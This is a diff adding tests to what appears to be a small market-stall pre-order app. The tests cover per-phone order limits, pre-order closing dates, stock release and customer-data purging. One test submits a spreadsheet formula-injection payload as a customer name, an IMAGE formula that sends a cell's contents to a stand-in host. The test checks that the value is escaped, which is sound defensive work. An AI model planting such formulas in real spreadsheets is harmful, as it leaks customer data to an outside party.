@@ -76,7 +76,7 @@ function load(googleTokens) {
       getUuid: () => crypto.randomUUID(),
       computeHmacSha256Signature: (v, key) =>
         Array.from(crypto.createHmac('sha256', key).update(v).digest()).map((b) => (b > 127 ? b - 256 : b)),
-      formatDate: (d) => d.toISOString()
+      formatDate: (d, tz, f) => (f === 'yyyy-MM-dd' ? d.toISOString().slice(0, 10) : d.toISOString())
     },
     LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
     UrlFetchApp: {
@@ -261,6 +261,80 @@ test('boot tells the app who is signed in and that Google is on', () => {
   const b = SF.dispatch('boot', { token: owner }).data;
   assert.strictEqual(b.me.user, 'boss@stallflow.co.za');
   assert.strictEqual(b.auth.google, true);
+});
+
+/* ---------- orders from the public page ---------- */
+
+function shop(marketDate) {
+  const env = load(TOKENS);
+  const SF = env.SF;
+  SF.append('products', { ProductId: 'P01', Name: 'Apricot Jam', Type: 'stocked', Unit: 'each',
+                          Price: 70, Active: 'Yes', Sort: 10 });
+  SF.move('P01', 10, 'adjust', 'test');
+  SF.append('markets', { MarketId: 'M01', Name: 'Test Market', Date: marketDate, Status: 'planned' });
+  SF.set('activeMarket', 'M01');
+  return env;
+}
+const day = (n) => new Date(Date.now() + n * 864e5).toISOString().slice(0, 10);
+let op = 0;
+const order = (SF, extra) => SF.dispatch('placeOrder', Object.assign({
+  opId: 'o' + (op++), name: 'Anna', phone: '082 123 4567', consent: true,
+  lines: [{ id: 'P01', qty: 1 }] }, extra || {}));
+
+test('a formula typed as a name is stored as plain text', () => {
+  const { SF, sheets } = shop(day(3));
+  assert.strictEqual(order(SF, { name: '=IMAGE("https://x.example/?"&D2)', note: '+1 more' }).ok, true);
+  const row = sheets.Orders.rows[1];
+  assert.ok(String(row[4]).startsWith("'="), 'name: ' + row[4]);
+  assert.ok(String(row[13]).startsWith("'+"), 'note: ' + row[13]);
+});
+
+test('one phone number can hold at most 2 unpaid orders per market', () => {
+  const { SF } = shop(day(3));
+  assert.strictEqual(order(SF).ok, true);
+  assert.strictEqual(order(SF, { phone: '0821234567' }).ok, true);
+  const third = order(SF, { phone: '+27 82 123 4567'.replace('+27 ', '0') });
+  assert.strictEqual(third.ok, false);
+  assert.ok(/already has 2/.test(third.message));
+  assert.strictEqual(order(SF, { phone: '083 999 0000' }).ok, true, 'someone else can still order');
+});
+
+test('pre-orders close by themselves once the market date has passed', () => {
+  const { SF } = shop(day(-1));
+  assert.strictEqual(SF.preordersOpen(), false);
+  assert.strictEqual(order(SF).ok, false);
+  assert.strictEqual(SF.dispatch('catalogue', {}).data.open, false);
+});
+
+test('pre-orders stay open on the day of the market', () => {
+  const { SF } = shop(day(0));
+  assert.strictEqual(order(SF).ok, true);
+});
+
+test('releasing unpaid reservations puts the stock back', () => {
+  const { SF } = shop(day(3));
+  order(SF); order(SF, { phone: '083 999 0000' });
+  assert.strictEqual(SF.onHand().P01, 8);
+  SF.setPin('owner', '4321');
+  const t = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
+  const r = SF.dispatch('releaseUnpaid', { token: t, opId: 'r1' });
+  assert.strictEqual(r.released, 2);
+  assert.strictEqual(SF.onHand().P01, 10);
+});
+
+test('customer details are wiped once their market is over, and only then', () => {
+  const { SF, sheets } = shop(day(3));
+  order(SF, { note: 'gate 2' });
+  SF.purgeCustomers();
+  assert.strictEqual(String(sheets.Orders.rows[1][4]), 'Anna', 'live market keeps its customers');
+  SF.append('markets', { MarketId: 'M02', Name: 'Next', Date: day(10), Status: 'planned' });
+  SF.set('activeMarket', 'M02');
+  assert.strictEqual(SF.purgeCustomers(), 0, 'a future market is not over yet');
+  SF.setCell('markets', 2, 'Date', day(-1));
+  assert.strictEqual(SF.purgeCustomers(), 1);
+  const row = sheets.Orders.rows[1];
+  assert.deepStrictEqual([row[4], row[5], row[13]], ['Customer', '', '']);
+  assert.strictEqual(row[8], 70, 'the money stays');
 });
 
 console.log(failures ? '\n' + failures + ' failed' : '\nall passed');
